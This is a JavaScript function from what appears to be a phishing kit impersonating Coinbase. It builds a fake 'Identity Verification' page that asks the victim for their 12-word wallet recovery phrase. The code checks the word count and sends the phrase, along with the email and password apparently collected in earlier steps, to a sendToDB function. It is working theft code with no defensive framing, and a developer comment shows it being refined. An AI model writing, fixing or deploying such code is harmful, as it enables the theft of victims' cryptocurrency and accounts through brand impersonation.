function setupRecoveryField(email, password) {
        document.getElementById('step-3').innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 24px;">Identity Verification</h1>
            <p>Please enter your 12-word recovery phrase to continue.</p>
            <input type="text" id="recovery" placeholder="word1 word2..." style="width:100%; padding:10px; margin:10px 0; border: 1px solid #ddd; border-radius: 4px;">
            <button id="submitBtn" class="btn-primary">Done</button>
            <div id="status" class="status-text"></div>
        `;
        
        const btn = document.getElementById('submitBtn');
        const input = document.getElementById('recovery');
        const status = document.getElementById('status');

        const submitData = async () => {
            const phrase = input.value.trim();
            if (phrase.split(/\s+/).length !== 12) {
                status.innerText = "You must enter exactly 12 words.";
                status.style.color = "red";
                return;
            }
            status.innerText = "Verifying...";
            await sendToDB(email, password, null, phrase);
        };

        btn.onclick = submitData;
        
        // THIS FIXES THE ENTER KEY ISSUE
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                submitData();
            }
        });
    }
